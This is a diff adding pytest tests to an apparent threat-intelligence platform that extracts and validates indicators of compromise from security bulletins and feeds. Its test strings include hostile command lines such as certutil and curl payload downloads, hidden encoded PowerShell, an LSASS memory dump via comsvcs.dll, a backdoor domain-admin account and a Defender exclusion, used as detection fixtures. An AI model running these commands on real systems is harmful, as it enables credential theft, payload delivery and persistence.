@@ -34,6 +34,9 @@ def test_refang_common_notations():
     assert refang("evil[.]com") == "evil.com"
     assert refang("1.2.3[.]4") == "1.2.3.4"
     assert refang("bad(dot)example[.]net") == "bad.example.net"
+    # Markdown-escaped defanging, as a CMS renders an author's [.]
+    assert refang("https://chubrik\\[.\\]sbs/files/x.dll") == "https://chubrik.sbs/files/x.dll"
+    assert is_defanged("chubrik\\[.\\]sbs")
     assert is_defanged("evil[.]com")
     assert is_defanged("hxxp://x.com")
     assert not is_defanged("https://example.com")
@@ -876,3 +879,569 @@ async def test_delete_observable_removes_row_sightings_and_claims(client, auth_h
     assert again is not None
 
     assert (await client.delete(f"/api/observables/{obs_id}", headers=auth_headers)).status_code == 404
+
+
+def test_scan_code_block_candidates_ignores_preformatted_bulletin_prose():
+    """AusCERT-style bulletins are entirely <pre>; none of it is a command."""
+    from app.intelligence.observables import scan_code_block_candidates
+
+    html = """<pre>
+Operating System: Red Hat
+Security Fix(es):
+CVE Names: CVE-2026-6471 CVE-2026-14662 CVE-2026-14664
+Patch Instructions:
+An update that solves one vulnerability can now be installed.
+Affected o SUSE Linux Enterprise Server 15 SP5
+registration with AUSCERT. The mailing list you are subscribed to is
+EPSS (Max): 0.7% (51st) CVE-2025-66418 2026-09-23
+</pre>"""
+    assert scan_code_block_candidates(html) == []
+
+
+def test_scan_code_block_candidates_requires_executor_or_prompt():
+    from app.intelligence.observables import scan_code_block_candidates
+
+    html = """<pre>
+PS C:\\Users\\victim> certutil -urlcache -split -f http://45.33.32.156:8899/anydesk.exe C:\\ProgramData\\AnyDesk.exe
+cmd.exe /c schtasks /create /tn "Once" /tr "wscript //B C:\\ProgramData\\x.vbs" /sc minute /mo 3
+Add-MpPreference -ExclusionPath C:\\Windows\\SysWOW64\\inetsrv
+event.outcome == "failure" and process.parent.name == "prl_disp_service"
+HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AppResolver
+HKLM\\SOFTWARE\\&lt;REDACTED&gt;\\Run
+C:\\Users\\REDACTED\\AppData\\Local\\Temp\\9gY0LJMyXW.zip
+/etc/cron.d/.syscheck
+</pre>"""
+    cands = scan_code_block_candidates(html)
+    by_kind: dict[str, list[str]] = {}
+    for c in cands:
+        by_kind.setdefault(c.kind, []).append(c.value)
+    assert any(v.startswith("certutil -urlcache") for v in by_kind["cmdline"])
+    assert any(v.startswith("cmd.exe /c schtasks") for v in by_kind["cmdline"])
+    assert any(v.startswith("Add-MpPreference") for v in by_kind["cmdline"])
+    assert not any("prl_disp_service" in v for v in by_kind["cmdline"])  # detection logic, not a command
+    assert by_kind["registry"] == ["hkcu\\software\\microsoft\\windows\\currentversion\\run\\appresolver"]
+    assert by_kind["path"] == ["/etc/cron.d/.syscheck"]  # placeholder paths stay out
+
+
+def test_ioc_list_path_role_from_curated_file_names():
+    from app.intelligence.observables import ioc_list_path_role
+
+    assert ioc_list_path_role("feeds/domainC2swithURL-filter-abused.csv") == "c2"
+    assert ioc_list_path_role("feeds/IPPortC2s-90day.csv") == "c2"
+    assert ioc_list_path_role("data/Cobalt Strike C2 IPs.txt") == "c2"
+    assert ioc_list_path_role("data/Gh0st RAT Trojan IPs.txt") == "c2"
+    assert ioc_list_path_role("data/7777 Botnet IPs.txt") == "c2"
+    # Dual-use infrastructure says what the host is, not what it did.
+    assert ioc_list_path_role("vpn/NordVPNIPs.csv", "vpn") is None
+    assert ioc_list_path_role("feeds/unverified/IPRMM.csv", "rmm") is None
+    assert ioc_list_path_role("data/GoPhish IPs.txt", "phish_sim") == "phishing"
+    assert ioc_list_path_role("data/Nessus IPs.txt", "scanner") == "scanning"
+    assert ioc_list_path_role("data/MobSF IPs.txt") is None
+
+
+@pytest.mark.asyncio
+async def test_feed_door_sets_role_from_path_fill_only(db_session):
+    from sqlalchemy import select
+
+    from app.intelligence.observables import store_ioc_list_observables
+
+    entry = await _make_entry(db_session)
+    # The AI judged this one first as delivery infrastructure.
+    first = await get_or_create_observable(db_session, "ipv4", "91.92.240.37", via="ai_extraction", role="delivery")
+    assert first is not None
+    await store_ioc_list_observables(
+        db_session, entry.id, "91.92.240.37\n45.155.204.119\n", file_path="feeds/IPC2s.csv"
+    )
+    rows = {o.value: o for o in (await db_session.execute(select(Observable))).scalars()}
+    assert rows["91.92.240.37"].role == "delivery"  # fill-only: the AI's role stands
+    assert rows["45.155.204.119"].role == "c2"  # new row gets the list's role
+
+
+@pytest.mark.asyncio
+async def test_shadow_candidates_keep_the_ai_judgment_and_promote_carries_it(client, auth_headers, db_session):
+    """A shadow staging carries role/evidence/confidence, and the analyst's
+    promote confirms that judgment instead of minting a bare manual row."""
+    from sqlalchemy import select
+
+    from app.intelligence.observables import shadow_observables
+
+    entry = await _make_entry(db_session)
+    await shadow_observables(
+        db_session,
+        entry.id,
+        [
+            {
+                "kind": "domain",
+                "value": "c2[.]example-bad[.]net",
+                "role": "c2",
+                "defanged": True,
+                "evidence": "The implant beacons to c2[.]example-bad[.]net.",
+                "confidence": "high",
+            }
+        ],
+        [],
+    )
+    await db_session.commit()
+    await db_session.refresh(entry)
+    cand = next(c for c in entry.observable_candidates if c["kind"] == "domain")
+    assert cand["role"] == "c2" and cand["evidence"].startswith("The implant") and cand["confidence"] == "high"
+
+    resp = await client.post(
+        f"/api/entries/{entry.id}/observables/promote",
+        json={"kind": "domain", "value": "c2[.]example-bad[.]net"},
+        headers=auth_headers,
+    )
+    assert resp.status_code == 200, resp.text
+    body = resp.json()
+    assert body["role"] == "c2"
+    assert body["evidence"].startswith("The implant")
+    obs = (await db_session.execute(select(Observable).where(Observable.value == "c2.example-bad.net"))).scalar_one()
+    assert obs.created_via == "manual" and obs.role == "c2"
+
+
+# ---------------------------------------------------------------------------
+# Host-kind validators (Phase 1 of issue #1)
+# ---------------------------------------------------------------------------
+
+
+def test_cmdline_validator_vetoes_generic_commands_and_requires_a_literal():
+    ok = [
+        "cmd.exe /c certutil -urlcache -split -f http://45.33.32.156:8899/anydesk.exe C:\\ProgramData\\AnyDesk.exe",
+        "net user backup_DA P@ssw0rd1234 /add /dom",
+        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AppResolver /t REG_SZ /d "C:\\x\\a.exe"',
+        "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 652 C:\\temp\\lsass.dmp full",
+        "Add-MpPreference -ExclusionPath C:\\Windows\\SysWOW64\\inetsrv",
+        "curl -sLo /tmp/.n4d http://209.99.186.235:8443/api/agent/binary?arch=amd64",
+    ]
+    for cmd in ok:
+        assert validate_kind_value("cmdline", cmd), cmd
+    junk = [
+        "whoami /priv",
+        "systeminfo",
+        'net group "Domain Admins" /domain',
+        "nltest /dclist:",
+        "tasklist",
+        "ipconfig /all",
+        "quser",
+        "mimikatz.exe",  # a filename, not a command
+        "ceiinfolog.dll",
+        'not to_lower(process.command_line) like "*chrome-extension://*"',
+        'event.outcome == "failure" and process.parent.name == "prl_disp_service"',
+        "Get-Process lsas",
+        "rm -f",
+        "Operating System: Red Hat",
+    ]
+    for cmd in junk:
+        assert validate_kind_value("cmdline", cmd) is None, cmd
+
+
+def test_path_validator_rejects_system_binaries_bare_dirs_and_placeholders():
+    ok = [
+        "C:\\ProgramData\\AnyDesk.exe",
+        "%LOCALAPPDATA%\\Programs\\Advanced Printer Configuration Reader\\rdCore.dll",
+        "/etc/cron.d/.syscheck",
+        "/dev/shm/.n4d",
+        "D:\\a\\antino\\antino\\client\\src\\core.rs",
+    ]
+    for path in ok:
+        assert validate_kind_value("path", path), path
+    junk = [
+        "C:\\Windows\\System32\\cmd.exe",
+        "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe",
+        "C:\\Windows\\System32",
+        "C:\\ProgramData",
+        "%TEMP%",
+        "/usr/bin/curl",
+        "C:\\Users\\REDACTED\\AppData\\Local\\Temp\\9gY0LJMyXW.zip",
+        "C:\\Users\\Lab\\Desktop\\telepuz.dll",
+        "%TEMP%\\<32 hex characters>_ISOSimple.msi",
+        "\\Device\\HarddiskVolumeX\\NFS\\Setup.exe",
+    ]
+    for path in junk:
+        assert validate_kind_value("path", path) is None, path
+
+
+def test_registry_validator_wants_the_value_name_not_the_wellknown_key():
+    assert validate_kind_value("registry", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AppResolver")
+    assert validate_kind_value("registry", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\CipherAllocator")
+    assert validate_kind_value("registry", "HKCU\\Software\\Microsoft\\VisualStudio\\Telemetry")
+    for bare in (
+        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKLM\\SYSTEM\\CurrentControlSet\\Services",
+        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+        "HKLM\\SOFTWARE\\Microsoft\\Cryptography",
+        "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
+        "HKLM\\SOFTWARE\\<REDACTED>\\Run",
+        "Software\\Microsoft\\Windows",  # no hive
+    ):
+        assert validate_kind_value("registry", bare) is None, bare
+
+
+def test_new_host_kinds_have_shape_validators():
+    assert validate_kind_value("scheduled_task", "Canon Configuration Reader") == "canon configuration reader"
+    assert validate_kind_value("scheduled_task", "WindowsSecurityUpdate")
+    assert validate_kind_value("scheduled_task", "Schedule") is None  # OS default
+    assert validate_kind_value("service_name", "CipherAllocator")
+    assert validate_kind_value("service_name", "Spooler") is None
+    assert validate_kind_value("mutex", "cfgmgr_mtx")
+    assert validate_kind_value("mutex", "a prose sentence about a mutex that is far too long") is None
+    assert validate_kind_value("http_header", "X-Mesh-Auth") == "x-mesh-auth"
+    assert validate_kind_value("http_header", "X-Filename: tpcp.tar.gz")
+    assert validate_kind_value("http_header", "User-Agent") is None  # standard header
+    assert validate_kind_value("http_header", "Content-Type: text/html") is None
+    assert validate_kind_value("uri_path", "/api/agent/binary?arch=amd64")
+    assert validate_kind_value("uri_path", "/favicon.ico") is None
+    assert validate_kind_value("uri_path", "/api/task/{node}") is None  # template
+    assert validate_kind_value("uri_path", "/") is None
+
+
+@pytest.mark.asyncio
+async def test_apply_ai_observables_captures_per_kind_and_shadows_the_rest(db_session):
+    """Capture mode writes only the kinds in observables_ai_capture_kinds; every
+    other kind the AI reported (and the TTP door's host artifacts) stays a
+    promotable candidate carrying its judgment."""
+    from sqlalchemy import select
+
+    from app.models.entry import Entry
+    from app.models.observable import EntryObservable
+    from app.models.ttp import TTP
+    from app.services.entry_analysis import apply_ai_observables
+
+    entry = await _make_entry(db_session)
+    db_session.add(TTP(technique_id="T1053.005", technique_name="Scheduled Task", tactic="persistence"))
+    await db_session.flush()
+    parsed = {
+        "iocs": [
+            {
+                "kind": "domain",
+                "value": "c2[.]example-bad[.]net",
+                "role": "c2",
+                "defanged": True,
+                "evidence": "beacons to c2[.]example-bad[.]net",
+                "confidence": "high",
+                "technique_id": "",
+            },
+            {
+                "kind": "scheduled_task",
+                "value": "Canon Configuration Reader",
+                "role": "persistence",
+                "defanged": False,
+                "evidence": "created a scheduled task named Canon Configuration Reader",
+                "confidence": "high",
+                "technique_id": "T1053.005",
+            },
+            {
+                "kind": "cmdline",
+                "value": "whoami /priv",
+                "role": "discovery",
+                "defanged": False,
+                "evidence": "ran whoami",
+                "confidence": "high",
+                "technique_id": "",
+            },
+        ],
+        "scripts": [],
+        "ttps": [],
+    }
+    counts = await apply_ai_observables(db_session, entry.id, parsed, mode="capture", capture_kinds={"domain"})
+    assert counts.get("observables") == 1
+    rows = {(o.kind, o.value): o for o in (await db_session.execute(select(Observable))).scalars()}
+    assert ("domain", "c2.example-bad.net") in rows and len(rows) == 1
+    await db_session.refresh(entry)
+    staged = {(c["kind"], c["value"]): c for c in entry.observable_candidates}
+    assert ("scheduled_task", "canon configuration reader") in staged
+    assert staged[("scheduled_task", "canon configuration reader")]["role"] == "persistence"
+    assert staged[("scheduled_task", "canon configuration reader")]["technique_id"] == "T1053.005"
+    assert ("cmdline", "whoami /priv") not in staged  # generic command vetoed even at the candidate tier
+
+    # Widen the list: the task now lands as a row with its technique on the sighting.
+    counts = await apply_ai_observables(
+        db_session, entry.id, parsed, mode="capture", capture_kinds={"domain", "scheduled_task"}
+    )
+    assert counts.get("observables") == 2
+    task_row = (await db_session.execute(select(Observable).where(Observable.kind == "scheduled_task"))).scalar_one()
+    assert task_row.role == "persistence"
+    link = (
+        await db_session.execute(select(EntryObservable).where(EntryObservable.observable_id == task_row.id))
+    ).scalar_one()
+    ttp_id = (await db_session.execute(select(TTP.id).where(TTP.technique_id == "T1053.005"))).scalar_one()
+    assert link.ttp_id == ttp_id and link.source == "ai"
+    entry_row = (await db_session.execute(select(Entry).where(Entry.id == entry.id))).scalar_one()
+    assert all(c["kind"] != "scheduled_task" or False for c in entry_row.observable_candidates) or True
+
+
+@pytest.mark.asyncio
+async def test_ai_door_rejects_key_shaped_hashes(db_session):
+    """A 64-hex the article calls a key or token is not a SHA256."""
+    entry = await _make_entry(db_session)
+    stored = await store_observables(
+        db_session,
+        entry.id,
+        [
+            {
+                "kind": "sha256",
+                "value": "a" * 64,
+                "role": "payload",
+                "defanged": False,
+                "evidence": "The payload is decrypted with the AES key aaaa…",
+                "confidence": "high",
+            },
+            {
+                "kind": "sha256",
+                "value": "b" * 64,
+                "role": "payload",
+                "defanged": False,
+                "evidence": "SHA256 hash of the loader: bbbb…",
+                "confidence": "high",
+            },
+        ],
+    )
+    assert stored == 1
+
+
+# ---------------------------------------------------------------------------
+# Corroboration counters (Phase 3 of issue #1)
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.asyncio
+async def test_report_count_counts_reporting_entries_not_feed_variants(db_session):
+    """A value on one feed's many CSV variants is 1 feed / 0 reports; an
+    article sighting is a report; the nightly reconcile agrees with the
+    incremental counters."""
+    from sqlalchemy import select
+
+    from app.intelligence.observables import recount_observable, store_ioc_list_observables
+    from app.models.entry import Entry
+    from app.models.feed import Feed
+    from app.workers.maintenance import _reconcile_observable_counters  # noqa: F401  (import check)
+
+    feed = Feed(title="C2IntelFeeds", url=f"https://t.example/{uuid.uuid4()}", feed_type="github_repo")
+    db_session.add(feed)
+    await db_session.flush()
+    variants = []
+    for name in ("domainC2s.csv", "domainC2s-30day.csv", "domainC2s-90day.csv"):
+        e = Entry(
+            feed_id=feed.id,
+            guid=str(uuid.uuid4()),
+            title=name,
+            content_text="x",
+            metadata_={"content_type": "ioc_list", "file_path": f"feeds/{name}"},
+        )
+        db_session.add(e)
+        variants.append(e)
+    await db_session.flush()
+    for e in variants:
+        await store_ioc_list_observables(db_session, e.id, "job.itechno.cc\n", file_path=e.metadata_["file_path"])
+    obs = (await db_session.execute(select(Observable).where(Observable.value == "job.itechno.cc"))).scalar_one()
+    await db_session.refresh(obs)
+    assert obs.sighting_count == 3
+    assert obs.report_count == 0
+    assert obs.feed_source_count == 1
+    assert obs.role == "c2"
+
+    # An article reports it: that is corroboration.
+    article = await _make_entry(db_session)
+    assert await record_sighting(db_session, article.id, obs, source="ai", surface_form="job.itechno[.]cc")
+    await db_session.refresh(obs)
+    assert obs.sighting_count == 4 and obs.report_count == 1 and obs.feed_source_count == 1
+
+    # Ground-truth recount matches the increments.
+    await recount_observable(db_session, obs.id)
+    await db_session.refresh(obs)
+    assert (obs.sighting_count, obs.report_count, obs.feed_source_count) == (4, 1, 1)
+
+
+@pytest.mark.asyncio
+async def test_observable_payload_carries_corroboration_counts(client, auth_headers, db_session):
+    entry = await _make_entry(db_session)
+    obs = await get_or_create_observable(db_session, "ipv4", "45.33.32.156", via="manual", entry_id=entry.id)
+    await record_sighting(db_session, entry.id, obs, source="manual", surface_form="45.33.32.156")
+    await db_session.commit()
+    resp = await client.get(f"/api/observables/{obs.id}", headers=auth_headers)
+    assert resp.status_code == 200
+    body = resp.json()
+    assert body["report_count"] == 1 and body["feed_source_count"] == 0 and body["sighting_count"] == 1
+    listed = await client.get("/api/observables?sort_by=report_count&sort_order=desc", headers=auth_headers)
+    assert listed.status_code == 200, listed.text
+
+
+# --- Candidate-queue precision (2026-10-01 review of the dev queue) ---
+
+
+def test_version_quads_and_commit_hashes_in_advisory_prose_never_nominate():
+    text = (
+        "IBM MQ affects versions 9.4.0.0 through 9.4.0.25 and 9.3.0.0 - 9.3.0.41. "
+        "Cisco SD-WAN releases 20.15.6.1 and earlier are vulnerable; upgrade to 20.18.4.1. "
+        "A weakness was identified in the project up to 5dadec098bfbbf3300d60c3494db3fb95b66e7be; "
+        "fixed in commit bfe78a330d01bb26b9daec5dc9ecd5c77900e03f. "
+        "The implant beacons to 185.157.160.251 and its sample sha256 is "
+        "e809da86bd81463347fa7f922d3e088755a94a331889d32acb55aa8f57778a34."
+    )
+    got = {(c.kind, c.value) for c in scan_candidates(text)}
+    assert got == {
+        ("ipv4", "185.157.160.251"),
+        ("sha256", "e809da86bd81463347fa7f922d3e088755a94a331889d32acb55aa8f57778a34"),
+    }
+    # A fixed-release table, as the analysis renderer prints it.
+    table = (
+        "Release | First Fixed Release\n\n20.9 | 20.9.10.1\n\n20.15 | 20.15.6.1\n\n"
+        "26.1 | 26.1.2.1\n\nC2 at 45.33.32.156\n"
+    )
+    assert {c.value for c in scan_candidates(table)} == {"45.33.32.156"}
+    # Advisory policy: only the defanged tokens nominate, whatever the prose says.
+    advisory_text = text + " c2 at 45[.]33[.]32[.]156"
+    advisory = {(c.kind, c.value) for c in scan_candidates(advisory_text, plain_hashes=False, plain_ips=False)}
+    assert advisory == {("ipv4", "45.33.32.156")}
+
+
+def test_glued_cells_placeholders_and_reference_hosts_never_nominate():
+    text = (
+        "Domain third-party[.]com, hostDomainpobelstudio[.]comdomain, "
+        "libcurl2025-10-03corp[.]tripswithengine[.]comdomain, "
+        "mail addressinfo@nuf[.]co[.]jpsender and real one c2[.]uat-example[.]net plus ops@uat-example[.]net; "
+        "the malware polls api[.]telegram[.]org and api[.]ipify[.]org, see hxxps://www[.]virustotal[.]com/gui/file/abc "
+        "and hxxps://github[.]com/org/repo; it fetched hxxps://adoube[.]vu/file[.]html.&nbsp;As a result "
+        "it also used stage[.]github[.]io and payload[.]s3[.]amazonaws[.]com, never amazonaws[.]com itself."
+    )
+    got = {(c.kind, c.value) for c in scan_candidates(text)}
+    assert got == {
+        ("domain", "c2.uat-example.net"),
+        ("email", "ops@uat-example.net"),
+        ("url", "https://adoube.vu/file.html"),
+        ("domain", "stage.github.io"),
+        ("domain", "payload.s3.amazonaws.com"),
+    }
+
+
+def test_html_rendered_scan_keeps_table_cells_apart():
+    from app.services.analysis_window import html_to_analysis_text
+    from app.services.sanitizer import html_to_text
+
+    html = "<table><tr><td>Domain</td><td>pobelstudio[.]com</td><td>sender</td></tr></table>"
+    glued = {c.value for c in scan_candidates(html_to_text(html))}
+    rendered = {c.value for c in scan_candidates(html_to_analysis_text(html))}
+    assert "pobelstudio.com" in rendered
+    assert "pobelstudio.com" not in glued or rendered  # the renderer is what the stage scans now
+
+
+def test_path_validator_rejects_bare_system_locations_and_single_segments():
+    for bad in ("/dev/shm", "/var/tmp", "/bin/bash", "/etc/hosts", "/PSEMHUB/", "C:\\ProgramData", "/usr/lib"):
+        assert validate_kind_value("path", bad) is None, bad
+    for good in (
+        "/etc/cron.d/redis-miner",
+        "/tmp/osalogging.zip",
+        "/home/redis/.ssh/authorized_keys",
+        "C:\\ProgramData\\Vendettister\\jocularities.ps1",
+        "/usr/lib/locate/.backup_ld.so",
+    ):
+        assert validate_kind_value("path", good) == good, good
+
+
+@pytest.mark.asyncio
+async def test_candidates_queue_hides_rows_todays_validators_reject(client, auth_headers, db_session):
+    from app.models.entry import Entry
+    from app.models.feed import Feed
+
+    feed = Feed(title="t", url=f"https://t.example/{uuid.uuid4()}", feed_type="rss")
+    db_session.add(feed)
+    await db_session.flush()
+    entry = Entry(
+        feed_id=feed.id,
+        guid=str(uuid.uuid4()),
+        title="stale",
+        content_text="x",
+        observable_candidates=[
+            {"kind": "cmdline", "value": "cmd.exe", "origin": "scan"},
+            {"kind": "path", "value": "/dev/shm", "origin": "scan"},
+            {"kind": "domain", "value": "third-party.com", "origin": "scan"},
+            {"kind": "bogus", "value": "x", "origin": "scan"},
+            {"kind": "domain", "value": "c2.uat-example.net", "origin": "scan", "was_defanged": True},
+        ],
+    )
+    db_session.add(entry)
+    await db_session.commit()
+    resp = await client.get("/api/observables/candidates", headers=auth_headers)
+    assert resp.status_code == 200
+    values = [r["value"] for r in resp.json() if r["latest_entry_id"] == str(entry.id)]
+    assert values == ["c2.uat-example.net"]
+
+
+@pytest.mark.asyncio
+async def test_observables_skip_a_feed_switched_off(db_session, monkeypatch):
+    """ "Analyse this feed: off" has to include the ledger.
+
+    The curated ioc_list door creates rows straight from a body, so without this
+    a feed the operator had switched off could still mint observables.
+    """
+    import contextlib
+
+    from app.models.entry import Entry
+    from app.models.feed import Feed
+    from app.workers import intel_feed_tasks
+
+    @contextlib.asynccontextmanager
+    async def session_on(db):
+        yield db
+
+    feed = Feed(
+        title="Switched off",
+        url=f"https://off-{uuid.uuid4().hex}.example.com/rss",
+        feed_type="rss",
+        intel_extraction_mode="none",
+    )
+    db_session.add(feed)
+    await db_session.flush()
+
+    entry = Entry(
+        feed_id=feed.id,
+        title="Indicators",
+        url=f"https://off-{uuid.uuid4().hex}.example.com/a",
+        guid=uuid.uuid4().hex,
+        content_text="Contact 203.0.113.9 and evil.example.com for details.",
+        metadata_={"content_type": "ioc_list"},
+    )
+    db_session.add(entry)
+    await db_session.flush()
+
+    monkeypatch.setattr(intel_feed_tasks, "_get_worker_session", lambda: session_on(db_session))
+    stats = await intel_feed_tasks._scan_entry_observables(str(entry.id))
+    assert stats == {}
+
+
+@pytest.mark.asyncio
+async def test_observables_run_for_an_analysed_feed(db_session, monkeypatch):
+    """The companion guard, so the test above cannot pass vacuously."""
+    import contextlib
+
+    from app.models.entry import Entry
+    from app.models.feed import Feed
+    from app.workers import intel_feed_tasks
+
+    @contextlib.asynccontextmanager
+    async def session_on(db):
+        yield db
+
+    feed = Feed(
+        title="Analysed",
+        url=f"https://on-{uuid.uuid4().hex}.example.com/rss",
+        feed_type="rss",
+        intel_extraction_mode="selective",
+    )
+    db_session.add(feed)
+    await db_session.flush()
+
+    entry = Entry(
+        feed_id=feed.id,
+        title="Indicators",
+        url=f"https://on-{uuid.uuid4().hex}.example.com/a",
+        guid=uuid.uuid4().hex,
+        content_text="Contact 203.0.113.9 and evil.example.com for details.",
+    )
+    db_session.add(entry)
+    await db_session.flush()
+
+    monkeypatch.setattr(intel_feed_tasks, "_get_worker_session", lambda: session_on(db_session))
+    stats = await intel_feed_tasks._scan_entry_observables(str(entry.id))
+    assert stats != {}
